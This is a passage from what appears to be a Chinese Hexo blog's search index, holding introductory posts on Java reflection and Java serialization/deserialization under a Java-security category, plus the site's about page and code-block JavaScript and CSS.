队形对应类里包含的全部内部类 获取该类对象所在的外部类 Class&lt;?&gt; getDeclaringClass()：返回该 Class 对象对应类所在的外部类 获取该类对象对应类所实现的接口 Class&lt;?&gt;[] getInterfaces()：返回该 Class 对象对应类所实现的全部接口 获取该类对象对应类所继承的父类 Class&lt;? super T&gt; getSuperclass()：返回该 Class 对象对应类的超类的 Class 对象 获取该类对象对应类的修饰符、所在包、类名等基本信息 int getModifiers()：返回此类或接口的所有修饰符，修饰符由 public 、protected 、private 、final 、static 、abstract 等对应的常量组成，返回的整数应使用 Modifier 工具类的方法来解码，才可以获取真的修饰符 Package getPackage()：获取该类的包 String getName()：以字符串形式返回此 Class 对象所表示的类的简称","categories":["Java 安全"]},{"title":"基础篇 - Java 序列化与反序列化","path":"/2024/05/10/Java 安全/基础篇-Java序列化与反序列化/","content":"Java 序列化是指把 Java 对象转换为字节序列的过程，而 Java 反序列化是指把字节序列恢复为 Java 对象的过程。本文详细讲解了 Java 序列化与反序列化的实现。 Java 序列化与反序列化概述Java 序列化是指把 Java 对象转换为字节序列的过程，而 Java 反序列化是指把字节序列恢复为 Java 对象的过程。 序列化与反序列化实现条件只有实现了 Serializable 或者 Externalizable 接口的类的对象才能被序列化为字节序列。（不是则会抛出异常） Serializable 接口Serializable 接口是 Java 提供的序列化接口，它是一个空接口： 12public interface Serializable &#123;&#125; Serializable 用来标识当前类可以被 ObjectOutputStream 序列化，以及被 ObjectInputStream 反序列化。 Externalizable 接口Externalizable 接口是一个更高级别的序列化机制，它允许类对序列化和反序列化过程进行更多的控制和自定义。 实现了 Externalizable 接口的类可以被序列化，但是它与实现 Serializable 接口的类有所不同，Externalizable 接口的序列化和反序列化方法对对象的状态完全负责，包括对象的所有成员变量。因此，在 writeExternal 和 readExternal 方法中，需要手动指定对象的所有成员变量的序列化和反序列化过程。 类必须显式实现 Externalizable 接口。 类必须实现 writeExternal 和 readExternal 方法来手动指定对象的序列化和反序列化过程。这些方法负责将对象的状态写入和读取到指定的数据流中。 类必须提供一个公共的无参数构造函数，因为反序列化过程需要调用该构造函数来创建对象实例。 以下是代码示例： 1234567891011121314151617181920212223242526272829import java.io.*;public class MyClass implements Externalizable &#123; private int id; private String name; // 必须提供默认的构造函数 public MyClass() &#123;&#125; public MyClass(int id, String name) &#123; this.id = id; this.name = name; &#125; // 实现序列化的方法 @Override public void writeExternal(ObjectOutput out) throws IOException &#123; out.writeInt(id); out.writeUTF(name); &#125; // 实现反序列化的方法 @Override public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException &#123; id = in.readInt(); name = in.readUTF(); &#125;&#125; 其他条件除此之外，反序列化还有一些条件： 对象的所有成员都可序列化：如果一个类实现了 Serializable 接口，但其成员中有某些成员变量不可序列化，则序列化操作会失败。 静态成员变量不参与序列化：静态成员变量属于类级别的数据，不包含在序列化的过程中。 transient 关键字：如果某个成员变量被声明为 transient，则在序列化过程中会被忽略，不会被持久化。 序列化版本号 serialVersionUID：建议显式声明一个名为 serialVersionUID 的静态变量，用于控制序列化的版本。若不声明，Java 会根据类的结构自动生成一个版本号，但建议显式声明以确保序列化的兼容性。 序列化对象要将对象序列化成字节流，可以使用 ObjectOutputStream 类。通过 ObjectOutputStream 的 writeObject() 方法将对象写入输出流。 代码示例： 123456789101112131415161718import java.io.FileOutputStream;import java.io.ObjectOutputStream;public class SerializationExample &#123; public static void main(String[] args) &#123; try &#123; MyClass obj = new MyClass(); FileOutputStream fileOut = new FileOutputStream(&quot;object.ser&quot;); ObjectOutputStream out = new ObjectOutputStream(fileOut); out.writeObject(obj); out.close(); fileOut.close(); System.out.println(&quot;Object has been serialized&quot;); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 反序列化字节流要从字节流中反序列化对象，可以使用 ObjectInputStream 类。通过 ObjectInputStream 的 readObject() 方法读取输入流中的对象。 代码示例： 1234567891011121314151617import java.io.FileInputStream;import java.io.ObjectInputStream;public class DeserializationExample &#123; public static void main(String[] args) &#123; try &#123; FileInputStream fileIn = new FileInputStream(&quot;object.ser&quot;); ObjectInputStream in = new ObjectInputStream(fileIn); MyClass obj = (MyClass) in.readObject(); in.close(); fileIn.close(); System.out.println(&quot;Object has been deserialized&quot;); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 使用 ObjectOutputStream 与 ObjectInputStream 的注意事项在上面的代码中，使用 ObjectOutputStream（ ObjectInputStream ）之前，先使用了 FileOutputStream（FileInputStream ）来处理数据。 实际上，ObjectOutputStream 需要一个输出流作为参数，因此在使用 ObjectOutputStream 之前，先使用 FileOutputStream 打开文件并创建一个文件输出流对象，以便将对象序列化后的数据写入文件。 同理，ObjectInputStream 是基于输入流的，它需要一个输入流作为参数来读取对象的序列化数据。而 FileInputStream 是一种输入流，用于从文件中读取字节流数据。 此外，重要的一点是： ObjectOutputStream 中进行序列化操作的时候，会判断被序列化的对象是否自己重写了 writeObject 方法，如果重写了，就会调用被序列化对象自己的 writeObject 方法，如果没有重写，才会调用默认的序列化方法。 同理 ObjectInputStream 中进行序列化操作的时候，会判断被序列化的对象是否自己重写了 readObject方法，如果重写了，就会调用被序列化对象自己的 readObject方法，如果没有重写，才会调用默认的序列化方法。 常见的输入输出流除了 FileInputStream（ FileOutputStream）之外，根据条件的不同，还可以使用其他的输入输出流来处理数据。 以下是一些常见的输入输出流以及它们的使用条件： BufferedInputStream（BufferedOutputStream）： 使用条件：当需要对读取或写入的数据进行缓冲以提高性能时，特别是对大文件或网络数据流的读取或写入。 ByteArrayInputStream（ByteArrayOutputStream）： 使用条件：当需要从字节数组中读取数据，或将数据写入到字节数组中时。 ObjectInputStream（ObjectOutputStream）： 使用条件：当需要将输入流中的数据反序列化为对象，或将对象序列化后的数据写入到输出流时。 PipedInputStream（PipedOutputStream）： 使用条件：当需要通过管道与另一个线程进行数据交换时，可用于线程间通信。 DataInputStream（DataOutputStream）： 使用条件：当需要从输入流中以 Java 基本数据类型的格式读取数据，或以 Java 基本数据类型的格式将数据写入输出流时。 FileInputStream（FileOutputStream）： 使用条件：当需要从文件中读取字节数据，或将数据写入文件时。 其他自定义的 InputStream（OutputStream）： 使用条件：如果有特定的需求，可以自定义实现 InputStream（OutputStream）类的子类，来满足自己的需求，比如从特定硬件设备中读取数据等。 序列化版本号 serialVersionUIDJava 的序列化机制是通过判断运行时类的 serialVersionUID 来验证版本一致性的，在进行反序列化时，JVM 会把传进来的字节流中的 serialVersionUID 与本地实体类中的 serialVersionUID 进行比较，如果相同则认为是一致的，便可以进行反序列化，否则就会报序列化版本不一致的异常。 如果没有显示指定 serialVersionUID ，Java 会根据类的结构自动生成一个，这种情况下，只有同一次编译生成的 class 才会生成相同的 serialVersionUID 。 有时候由于 serialVersionUID 发生改变，导致反序列化不能成功，为了不出现这类的问题，可以在要序列化的类中显式的声明一个名为 “ serialVersionUID ” 、类型为 long 的变量，并指定其值： 1private static final long serialVersionUID = 1L; 这样就解决了兼容性问题。","categories":["Java 安全"]},{"title":"关于","path":"/about/index.html","content":"友链关于妙尽璇机履万世之馀风，察片叶于迷悟，掇翦羽于浮沉 螺旋之铭 用真实创造虚妄，以矛盾反转意义。拆解自己，正是为了成为自己。唯有创造对立，才能步入统一。"},{"title":"Page","path":"/page/index.html","content":"This is a page test."},{"path":"/custom/js/ZYCode.js","content":"// 这四个常量是复制,复制成功,展开,收缩 // 我使用的是 https://fontawesome.com/ 图标, 不用可以改为文字. const copyText = ''; const copySuccess = ''; const openText = ''; const closeText = ''; const codeElements = document.querySelectorAll('td.code'); codeElements.forEach((code, index) => { const preCode = code.querySelector('pre'); // 设置id和样式 preCode.id = `ZYCode${index+1}`; preCode.style.webkitLineClamp = '6'; // 添加展开/收起按钮 if (preCode.innerHTML.split('').length > 6) { const codeCopyDiv = document.createElement('div'); codeCopyDiv.classList.add('CodeCloseDiv'); code.parentNode.parentNode.parentNode.parentNode.appendChild(codeCopyDiv); const codeCopyOver = document.createElement('button'); codeCopyOver.classList.add('CodeClose'); codeCopyOver.innerHTML = openText; const parent = code.parentNode.parentNode.parentNode.parentNode; const description = parent.childNodes.length === 3 ? parent.children[2] : parent.children[1]; description.appendChild(codeCopyOver); codeCopyOver.addEventListener('click', () => { if (codeCopyOver.innerHTML === openText) { const scrollTop = document.documentElement.scrollTop; const codeHeight = code.clientHeight; if (scrollTop < codeHeight) { document.documentElement.scrollTop += codeHeight - scrollTop; } preCode.style.webkitLineClamp = '99999'; codeCopyOver.innerHTML = closeText; } else { preCode.style.webkitLineClamp = '6'; codeCopyOver.innerHTML = openText; } }); } // 添加复制按钮 const codeCopyBtn = document.createElement('div'); codeCopyBtn.classList.add('copy-btn'); codeCopyBtn.innerHTML = copyText; code.appendChild(codeCopyBtn); // 添加复制功能 codeCopyBtn.addEventListener('click', async () => { const currentCodeElement = code.querySelector('pre')?.innerText; await copyCode(currentCodeElement); codeCopyBtn.innerHTML = copySuccess; codeCopyBtn.classList.add('success'); setTimeout(() => { codeCopyBtn.innerHTML = copyText; codeCopyBtn.classList.remove('success'); }, 3000); }); }); async function copyCode(currentCode) { if (navigator.clipboard) { try { await navigator.clipboard.writeText(currentCode); } catch (error) { console.error(error); } } else { console.error('当前浏览器不支持此API'); } }"},{"title":"友链","path":"/friends/index.html","content":"友链关于小伙伴们我们齐聚于此，向世界证明，人类与其造物主拥有同样的伟力 妙尽璇机"},{"title":"收藏","path":"/bookmark/index.html","content":"…"},{"title":"朋友文章","path":"/friends/rss/index.html","content":""},{"path":"/custom/js/ZYCode.css","content":":root{ --code-autor: '© 钟意博客🌙'; --code-tip: \"优雅借鉴\"; } /*语法高亮*/ .hljs { position: relative; display: block; overflow-x: hidden; /*背景跟随Stellar*/ background: var(--block); color: #9c67a1; padding: 30px 5px 2px 5px; box-shadow: 0 10px 30px 0px rgb(0 0 0 / 40%) } .hljs::before { content: var(--code-tip); position: absolute; left: 15px; top: 10px; overflow: visible; width: 12px; height: 12px; border-radius: 16px; box-shadow: 20px 0 #a9a6a1, 40px 0 #999; -webkit-box-shadow: 20px 0 #999, 40px 0 #999; background-color: #999; white-space: nowrap; text-indent: 75px; font-size: 16px; line-height: 12px; font-weight: 700; color: #999 } .highlight:hover .hljs::before { color: #35cd4b; box-shadow: 20px 0 #fdbc40, 40px 0 #35cd4b; -webkit-box-shadow: 20px 0 #fdbc40, 40px 0 #35cd4b; background-color: #fc625d; } .hljs-ln { display: inline-block; overflow-x: auto; padding-bottom: 5px } .hljs-ln td { padding: 0; background-color: var(--block) } .hljs-ln::-webkit-scrollbar { height: 10px; border-radius: 5px; background: #333; } .hljs-ln::-webkit-scrollbar-thumb { background-color: #bbb; border-radius: 5px; } .hljs-ln::-webkit-scrollbar-thumb:hover { background: #ddd; } .hljs table tbody tr { border: none } .hljs .hljs-ln-line { padding: 1px 10px; border: none } td.hljs-ln-line.hljs-ln-numbers { border-right: 1px solid #666; } .hljs-keyword, .hljs-literal, .hljs-symbol, .hljs-name { color: #c78300 } .hljs-link { color: #569cd6; text-decoration: underline } .hljs-built_in, .hljs-type { color: #4ec9b0 } .hljs-number, .hljs-class { color: #2094f3 } .hljs-string, .hljs-meta-string { color: #4caf50 } .hljs-regexp, .hljs-template-tag { color: #9a5334 } .hljs-subst, .hljs-function, .hljs-title, .hljs-params, .hljs-formula { color: #c78300 } .hljs-property { color: #9c67a1; } .hljs-comment, .hljs-quote { color: #57a64a; font-style: italic } .hljs-doctag { color: #608b4e } .hljs-meta, .hljs-meta-keyword, .hljs-tag { color: #9b9b9b } .hljs-variable, .hljs-template-variable { color: #bd63c5 } .hljs-attr, .hljs-attribute, .hljs-builtin-name { color: #d34141 } .hljs-section { color: gold } .hljs-emphasis { font-style: italic } .hljs-strong { font-weight: bold } .hljs-bullet, .hljs-selector-tag, .hljs-selector-id, .hljs-selector-class, .hljs-selector-attr, .hljs-selector-pseudo { color: #c78300 } .hljs-addition { background-color: #144212; display: inline-block; width: 100% } .hljs-deletion { background-color: #600; display: inline-block; width: 100% } .hljs.language-html::before, .hljs.language-xml::before { content: \"HTML/XML\" } .hljs.language-javascript::before { content: \"JavaScript\" } .hljs.language-c::before { content: \"C\" } .hljs.language-cpp::before { content: \"C++\" } .hljs.language-java::before { content: \"Java\" } .hljs.language-asp::before { content: \"ASP\" } .hljs.language-actionscript::before { content: \"ActionScript/Flash/Flex\" } .hljs.language-bash::before { content: \"Bash\" } .hljs.language-css::before { content: \"CSS\" } .hljs.language-asp::before { content: \"ASP\" } .hljs.language-cs::before, .hljs.language-csharp::before { content: \"C#\" } .hljs.language-d::before { content: \"D\" } .hljs.language-golang::before, .hljs.language-go::before { content: \"Go\" } .hljs.language-json::before { content: \"JSON\" } .hljs.language-lua::before { content: \"Lua\" } .hljs.language-less::before { content: \"LESS\" } .hljs.language-md::before, .hljs.language-markdown::before, .hljs.language-mkdown::before, .hljs.language-mkd::before { content: \"Markdown\" } .hljs.language-mm::before, .hljs.language-objc::before, .hljs.language-obj-c::before, .hljs.language-objective-c::before { content: \"Objective-C\" } .hljs.language-php::before { content: \"PHP\" } .hljs.language-perl::before, .hljs.language-pl::before, .hljs.language-pm::before { content: \"Perl\" } .hljs.language-python::before, .hljs.language-py::before, .hljs.language-gyp::before, .hljs.language-ipython::before { content: \"Python\" } .hljs.language-r::before { content: \"R\" } .hljs.language-ruby::before, .hljs.language-rb::before, .hljs.language-gemspec::before, .hljs.language-podspec::before, .hljs.language-thor::before, .hljs.language-irb::before { content: \"Ruby\" } .hljs.language-sql::before { content: \"SQL\" } .hljs.language-sh::before, .hljs.language-shell::before, .hljs.language-Session::before, .hljs.language-shellsession::before, .hljs.language-console::before { content: \"Shell\" } .hljs.language-swift::before { content: \"Swift\" } .hljs.language-vb::before { content: \"VB/VBScript\" } .hljs.language-yaml::before { content: \"YAML\" } /*stellar主题补偿*/ .md-text pre>.hljs { padding-top: 2rem !important; } .md-text pre { padding: 0 !important; } code { background-image: linear-gradient(90deg, rgba(60, 10, 30, .04) 3%, transparent 0), linear-gradient(1turn, rgba(60, 10, 30, .04) 3%, transparent 0) !important; background-size: 20px 20px !important; background-position: 50% !important; } figure::after { content: var(--code-autor); text-align: right; font-size: 10px; float: right; margin-top: 3px; padding-right: 15px; padding-bottom: 8px; color: #999 } figcaption span { border-radius: 0px 0px 12px 12px !important; } /* 复制代码按钮 */ .highlight { position: relative; } .highlight .code .copy-btn { position: absolute; top: 0; right: 0; padding: 4px 0.5rem; opacity: 0.25; font-weight: 700; color: var(--theme); cursor: pointer; transination: opacity 0.3s; } .highlight .code .copy-btn:hover { color: var(--text-code); opacity: 0.75; } .highlight .code .copy-btn.success { color: var(--swiper-theme-color); opacity: 0.75; } /* 描述 */ .md-text .highlight figcaption span { font-size: small; } /* 折叠 */ code.hljs { display: -webkit-box; overflow: hidden; text-overflow: ellipsis; -webkit-box-orient: vertical; /*-webkit-line-clamp: 6;*/ padding: 1rem 1rem 0 1rem; /* chino建议 */ } .hljsOpen { -webkit-line-clamp: 99999 !important; } .CodeCloseDiv { color: #999; background: var(--block); display: flex; justify-content: center; margin-top: inherit; margin-bottom: -18px; } .CodeClose { color: #999; margin-top: 3px; background: var(--block); } .highlight button:hover, .highlight table:hover+button { color: var(--swiper-theme-color); opacity: 0.75; }"},{"title":"探索","path":"/explore/index.html","content":"…"}]